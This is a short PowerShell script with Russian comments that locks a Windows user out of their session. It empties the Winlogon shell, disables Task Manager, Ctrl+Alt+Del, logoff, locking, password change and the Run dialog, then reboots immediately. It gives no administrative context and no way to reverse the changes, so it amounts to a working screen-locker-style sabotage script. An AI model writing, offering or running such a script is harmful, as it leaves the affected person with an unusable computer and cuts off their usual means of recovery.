# Полностью пустой Shell — ничего не запустится после входа
Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name Shell -Value ""

# Отключение всего Ctrl + Alt + Del
Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name DisableTaskMgr -Value 1
Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name DisableChangePassword -Value 1
Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name DisableLockWorkstation -Value 1
Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name DisableLogoff -Value 1
Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name DisableCAD -Value 1

# Блокировка Win + R (Выполнить)
Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" -Name NoRun -Value 1

# Ребут
shutdown /r /t 0
